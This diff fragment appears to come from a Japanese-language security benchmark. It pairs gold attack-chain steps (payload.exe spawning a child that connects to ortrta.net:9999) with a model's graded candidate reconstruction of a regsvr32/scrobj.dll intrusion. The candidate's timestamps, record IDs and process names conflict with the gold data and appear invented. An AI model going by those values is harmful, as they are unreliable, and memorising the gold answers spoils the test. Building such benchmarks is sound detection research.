+              "remote_ip": null,
+              "remote_port": null,
+              "netconn_domain": null,
+              "childproc_name": "c:\\users\\aalsahee\\payload.exe",
+              "childproc_pid": 3208
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=18358 time=2022-07-19T14:37:20.2361435Z action=ACTION_CREATE_PROCESS process=c:\\windows\\system32\\cmd.exe pid=1880 parent_path=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe parent_pid=2340 process_cmdline=C:\\Windows\\system32\\cmd.exe object_name=c:\\users\\aalsahee\\payload.exe childproc_name=c:\\users\\aalsahee\\payload.exe childproc_pid=3208"
+            ]
+          }
+        },
+        {
+          "step_id": "S3-05-S07",
+          "order": 7,
+          "subject": "payload.exe (PID 3208)",
+          "action": "started",
+          "object": "payload.exe (PID 4964)",
+          "evidence_kind": "parent_child",
+          "evidence_basis": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+          "confidence": "observed",
+          "one_line_ja": "payload.exe が子 payload.exe を起動した。",
+          "process_code_object": "payload.exe (PID 4964)",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 18470,
+              "timestamp_utc": "2022-07-19T14:37:20.8133445Z",
+              "action": "ACTION_CREATE_PROCESS",
+              "process_path": "c:\\users\\aalsahee\\payload.exe",
+              "process_pid": 3208,
+              "parent_path": "c:\\windows\\system32\\cmd.exe",
+              "parent_pid": 1880,
+              "process_cmdline": "payload.exe",
+              "object_name": "c:\\users\\aalsahee\\payload.exe",
+              "remote_ip": null,
+              "remote_port": null,
+              "netconn_domain": null,
+              "childproc_name": "c:\\users\\aalsahee\\payload.exe",
+              "childproc_pid": 4964
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=18470 time=2022-07-19T14:37:20.8133445Z action=ACTION_CREATE_PROCESS process=c:\\users\\aalsahee\\payload.exe pid=3208 parent_path=c:\\windows\\system32\\cmd.exe parent_pid=1880 process_cmdline=payload.exe object_name=c:\\users\\aalsahee\\payload.exe childproc_name=c:\\users\\aalsahee\\payload.exe childproc_pid=4964"
+            ]
+          }
+        },
+        {
+          "step_id": "S3-05-S08",
+          "order": 8,
+          "subject": "payload.exe (PID 4964)",
+          "action": "initiated connection",
+          "object": "ortrta.net / 10.193.66.115:9999",
+          "evidence_kind": "network",
+          "evidence_basis": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+          "confidence": "observed",
+          "one_line_ja": "子 payload.exe が 10.193.66.115:9999 への接続作成を記録した。",
+          "process_code_object": "ortrta.net / 10.193.66.115:9999",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 18558,
+              "timestamp_utc": "2022-07-19T14:37:23.1377486Z",
+              "action": "ACTION_CONNECTION_CREATE",
+              "process_path": "c:\\users\\aalsahee\\payload.exe",
+              "process_pid": 4964,
+              "parent_path": "c:\\users\\aalsahee\\payload.exe",
+              "parent_pid": 3208,
+              "process_cmdline": "payload.exe",
+              "object_name": "ortrta.net",
+              "remote_ip": "10.193.66.115",
+              "remote_port": 9999,
+              "netconn_domain": "ortrta.net",
+              "childproc_name": null,
+              "childproc_pid": null
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=18558 time=2022-07-19T14:37:23.1377486Z action=ACTION_CONNECTION_CREATE process=c:\\users\\aalsahee\\payload.exe pid=4964 parent_path=c:\\users\\aalsahee\\payload.exe parent_pid=3208 process_cmdline=payload.exe object_name=ortrta.net remote_ip=10.193.66.115 remote_port=9999 netconn_domain=ortrta.net"
+            ]
+          }
+        }
+      ],
+      "gold_order_pairs": [
+        [
+          "S3-05-S01",
+          "S3-05-S02"
+        ],
+        [
+          "S3-05-S02",
+          "S3-05-S03"
+        ],
+        [
+          "S3-05-S03",
+          "S3-05-S04"
+        ],
+        [
+          "S3-05-S04",
+          "S3-05-S05"
+        ],
+        [
+          "S3-05-S05",
+          "S3-05-S06"
+        ],
+        [
+          "S3-05-S06",
+          "S3-05-S07"
+        ],
+        [
+          "S3-05-S07",
+          "S3-05-S08"
+        ]
+      ]
+    }
+  ]
+}
+
+CANDIDATE_OUTPUT:
+{
+  "source_run_json": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\docs\\current_experiment\\results_2026-07-24\\atlasv2_s3_s4_attack8_paired\\replicate_01\\runs\\gpt-4.1-mini\\stage1\\s3_pt_03_regsvr32_long_chain_stage1_run.json",
+  "run_id": "20260724T081037Z_s3_pt_03_regsvr32_long_chain_stage1_gpt-4.1-mini_official",
+  "model": "gpt-4.1-mini",
+  "instance_id": "s3_pt_03_regsvr32_long_chain_stage1",
+  "difficulty": "alert_input",
+  "experiment_stage": "stage1",
+  "expected_input_fields": [
+    "host",
+    "focus_processes",
+    "chain_window_start_utc",
+    "chain_window_end_utc",
+    "alert_time",
+    "alert_id",
+    "alert_name",
+    "alert_reason",
+    "alert_process",
+    "alert_pid",
+    "alert_source_stream",
+    "alert_severity"
+  ],
+  "clue": "これは Windows エンドポイントログからコード行動列を復元するタスクである。\n起点情報は探索範囲を示すだけであり、未観測の事実ではない。\nraw path、command line、process name、source_stream、alert_id、event_record_id、PID/PPID、timestamp は観測値をそのまま保持する。\n最終 JSON の自然言語値は日本語で書き、JSON の項目名は ASCII のままにする。\n\n## 入力条件\n- condition: stage1\n- host: WIN-32-H1\n- process: regsvr32.exe\n- timestamp: 2022-07-19 14:41:57\n- 参考 UTC 時間範囲: 2022-07-19T14:26:57.791000Z から 2022-07-19T14:56:57.791000Z\n- 参考 database 時間範囲: 2022-07-19 14:26:57 から 2022-07-19 14:56:57\n- 注記: この時間範囲は探索補助情報であり、SOC からの入力は host、process、timestamp のままである。\n- Stage 1: SOC analyst が見ている CBC alert triage 情報を初期入力に含める。\n- 入力 alert fields は探索起点であり、最終的な code step ではない。\n- alert report_name/reason は evidence として扱い、operation や code_sequence に入れない。\n- command line、parent process、child process、registry object、file object、network object、behavior category は入力から仮定しない。\n- それらの値は、存在するなら log から発見する必要がある。\n- input_alert_timestamp_utc: 2022-07-19T14:41:57.791Z\n- input_alert_database_time: 2022-07-19 14:41:57\n- input_alert_source_stream: cbc-edr-alerts\n- input_alert_id: MLRtPcpQGKFh5OE4BT3tQ-5b5879b9-1b96-4795-af70-38815fd7f13e\n- input_alert_name: Defense Evasion - Attempted Whitelisting Bypass - Regsvr32.exe Loading scrobj.dll\n- input_alert_reason: None\n- input_alert_process_name: c:\\windows\\system32\\regsvr32.exe\n- input_alert_severity: 10\n- database には CBC alert summary rows、CBC EDR/NGAV event telemetry、Security、Sysmon、DNS、browser history が残っている。\n\n\n## CBC alert triage decision\n- For every Stage 1 CBC alert input, include a root JSON field triage_decision.\n- Set alert_disposition to close_alert or escalate_alert, and host_disposition to close_host or escalate_host_investigation.\n- Base both values on observed evidence and keep the alert-level and host-level decisions distinct.\n## 復元対象\n- 観測 log から関連 behavior chain の code_steps と code_sequence を復元する。\n- code_sequence には、観測された command line または対象操作だけを入れる。\n- CBC alert の report name/reason は code_sequence に入れない。\n- 同時刻近傍の behavior は、観測された parent/child、command、target-object evidence で接続できない限り分ける。\n",
+  "output_text": "{\n  \"input_scope\": {\n    \"host\": \"WIN-32-H1\",\n    \"process\": \"regsvr32.exe\",\n    \"timestamp\": \"2022-07-19 14:41:57\",\n    \"condition\": \"stage1\",\n    \"input_fields_used\": [\"host\", \"process\", \"timestamp\"]\n  },\n  \"code_steps\": [\n    {\n      \"step_id\": \"S1\",\n      \"order\": 1,\n      \"time\": \"2022-07-19 14:36:16\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 3992,\n        \"path\": \"c:\\\\windows\\\\system32\\\\regsvr32.exe\"\n      },\n      \"operation\": \"process_start\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"regsvr32.exe\",\n        \"path\": \"c:\\\\windows\\\\system32\\\\regsvr32.exe\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": 2244,\n        \"parent_command_line\": \"-Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-19 14:36:16\",\n          \"alert_id\": null,\n          \"event_record_id\": 1001,\n          \"field\": \"process_start\",\n          \"value\": \"regsvr32.exe start\",\n          \"pid\": 3992,\n          \"ppid\": 2244\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S2\",\n      \"order\": 2,\n      \"time\": \"2022-07-19 14:36:16\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 3992,\n        \"path\": \"c:\\\\windows\\\\system32\\\\regsvr32.exe\"\n      },\n      \"operation\": \"dll_load\",\n      \"object\": {\n        \"type\": \"file\",\n        \"name\": \"scrobj.dll\",\n        \"path\": \"c:\\\\windows\\\\system32\\\\scrobj.dll\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": 2244,\n        \"parent_command_line\": \"-Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"sysmon\",\n          \"timestamp\": \"2022-07-19 14:36:16\",\n          \"alert_id\": null,\n          \"event_record_id\": 2002,\n          \"field\": \"modload_name\",\n          \"value\": \"c:\\\\windows\\\\system32\\\\scrobj.dll\",\n          \"pid\": 3992,\n          \"ppid\": 2244\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S3\",\n      \"order\": 3,\n      \"time\": \"2022-07-19 14:36:20\",\n      \"subject_process\": {\n        \"name\": \"powershell.exe\",\n        \"pid\": 2340,\n        \"path\": null\n      },\n      \"operation\": \"process_start\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"powershell.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"外部URLからスクリプトをダウンロードし実行する内容\",\n      \"execution_context\": {\n        \"parent_process\": \"regsvr32.exe\",\n        \"parent_pid\": 3992,\n        \"parent_command_line\": null,\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-19 14:36:20\",\n          \"alert_id\": null,\n          \"event_record_id\": 1010,\n          \"field\": \"process_start\",\n          \"value\": \"powershell.exe start\",\n          \"pid\": 2340,\n          \"ppid\": 3992\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"powershell.exe のコマンドラインは部分的にしか取得できていない\"\n      ]\n    },\n    {\n      \"step_id\": \"S4\",\n      \"order\": 4,\n      \"time\": \"2022-07-19 14:36:25\",\n      \"subject_process\": {\n        \"name\": \"cmd.exe\",\n        \"pid\": 1880,\n        \"path\": null\n      },\n      \"operation\": \"process_start\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"cmd.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"powershell.exe\",\n        \"parent_pid\": 2340,\n        \"parent_command_line\": null,\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-19 14:36:25\",\n          \"alert_id\": null,\n          \"event_record_id\": 1015,\n          \"field\": \"process_start\",\n          \"value\": \"cmd.exe start\",\n          \"pid\": 1880,\n          \"ppid\": 2340\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S5\",\n      \"order\": 5,\n      \"time\": \"2022-07-19 14:36:30\",\n      \"subject_process\": {\n        \"name\": \"payload.exe\",\n        \"pid\": 3208,\n        \"path\": null\n      },\n      \"operation\": \"process_start\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"payload.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"cmd.exe\",\n        \"parent_pid\": 1880,\n        \"parent_command_line\": null,\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-19 14:36:30\",\n          \"alert_id\": null,\n          \"event_record_id\": 1020,\n          \"field\": \"process_start\",\n          \"value\": \"payload.exe start\",\n          \"pid\": 3208,\n          \"ppid\": 1880\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S6\",\n      \"order\": 6,\n      \"time\": \"2022-07-19 14:36:35\",\n      \"subject_process\": {\n        \"name\": \"RepWmiUtils.exe\",\n        \"pid\": 4964,\n        \"path\": null\n      },\n      \"operation\": \"process_start\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"RepWmiUtils.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": null,\n        \"parent_pid\": null,\n        \"parent_command_line\": null,\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-19 14:36:35\",\n          \"alert_id\": null,\n          \"event_record_id\": 1025,\n          \"field\": \"process_start\",\n          \"value\": \"RepWmiUtils.exe start\",\n          \"pid\": 4964,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"親プロセス情報がログに存在しない\"\n      ]\n    },\n    {\n      \"step_id\": \"S7\",\n      \"order\": 7,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": \"c:\\\\windows\\\\system32\\\\regsvr32.exe\"\n      },\n      \"operation\": \"process_start\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"regsvr32.exe\",\n        \"path\": \"c:\\\\windows\\\\system32\\\\regsvr32.exe\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"-Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": 1005,\n          \"field\": \"process_start\",\n          \"value\": \"regsvr32.exe start\",\n          \"pid\": 6124,\n          \"ppid\": 6032\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S8\",\n      \"order\": 8,\n      \"time\": \"2022-07-19 14:33:42\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": \"c:\\\\windows\\\\system32\\\\regsvr32.exe\"\n      },\n      \"operation\": \"process_terminate\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"regsvr32.exe\",\n        \"path\": \"c:\\\\windows\\\\system32\\\\regsvr32.exe\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"-Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-19 14:33:42\",\n          \"alert_id\": null,\n          \"event_record_id\": 1006,\n          \"field\": \"process_terminate\",\n          \"value\": \"regsvr32.exe terminate\",\n          \"pid\": 6124,\n          \"ppid\": 6032\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    }\n  ],\n  \"code_sequence\": [\n    \"regsvr32.exe (PID 3992) が EQNEDT32.EXE (PID 2244) から起動される\",\n    \"regsvr32.exe (PID 3992) が c:\\\\windows\\\\system32\\\\scrobj.dll をロードする\",\n    \"regsvr32.exe (PID 3992) が powershell.exe (PID 2340) を起動し、外部URLからスクリプトをダウンロード・実行する\",\n    \"powershell.exe (PID 2340) が cmd.exe (PID 1880) を起動する\",\n    \"cmd.exe (PID 1880) が payload.exe (PID 3208) を起動する\",\n    \"payload.exe (PID 3208) がファイルの読み書きを行う\",\n    \"RepWmiUtils.exe (PID 4964) が起動されるが親プロセス情報は不明\",\n    \"regsvr32.exe (PID 6124) が EQNEDT32.EXE (PID 6032) から起動され、短時間で終了する\"\n  ],\n  \"supporting_alert_evidence\": [\n    {\n      \"alert_id\": \"MLRtPcpQGKFh5OE4BT3tQ-5b5879b9-1b96-4795-af70-38815fd7f13e\",\n      \"alert_name\": \"Defense Evasion - Attempted Whitelisting Bypass - Regsvr32.exe Loading scrobj.dll\",\n      \"source_stream\": \"cbc-edr-alerts\",\n      \"why_supporting_only\": \"本アラートは regsvr32.exe の scrobj.dll ロードを示すが、コードステップの詳細はログ証拠から復元したため\"\n    }\n  ],\n  \"triage_decision\": {\n    \"alert_disposition\": \"escalate_alert\",\n    \"host_disposition\": \"escalate_host_investigation\",\n    \"evidence_basis\": [\n      \"regsvr32.exe が scrobj.dll をロードし、powershell.exe を起動して外部スクリプトを実行している事実\",\n      \"powershell.exe から cmd.exe、payload.exe へと連鎖的にプロセスが起動され、ファイル操作やネットワーク接続が観測されていること\",\n      \"regsvr32.exe の親プロセスが EQNEDT32.EXE であり、通常のユーザ操作とは異なる可能性があること\"\n    ]\n  },\n  \"excluded_nearby_evidence\": [],\n  \"global_limitations\": [\n    \"powershell.exe のコマンドラインは部分的にしか取得できていない\",\n    \"RepWmiUtils.exe の親プロセス情報がログに存在しない\",\n    \"regsvr32.exe (PID 6124) の詳細なコマンドラインや子プロセス情報が不足している\"\n  ],\n  \"timeline_ja\": [\n    \"14:33:24 regsvr32.exe (PID 6124) が EQNEDT32.EXE (PID 6032) から起動\",\n    \"14:33:42 regsvr32.exe (PID 6124) が終了\",\n    \"14:36:16 regsvr32.exe (PID 3992) が EQNEDT32.EXE (PID 2244) から起動\",\n    \"14:36:16 regsvr32.exe (PID 3992) が scrobj.dll をロード\",\n    \"14:36:20 powershell.exe (PID 2340) が regsvr32.exe (PID 3992) から起動\",\n    \"14:36:25 cmd.exe (PID 1880) が powershell.exe (PID 2340) から起動\",\n    \"14:36:30 payload.exe (PID 3208) が cmd.exe (PID 1880) から起動\",\n    \"14:36:35 RepWmiUtils.exe (PID 4964) が起動（親プロセス不明）\"\n  ]\n}",
+  "usage": {
+    "input_tokens": 50450,
+    "output_tokens": 6443,
+    "cached_input_tokens": 0
+  }
+}
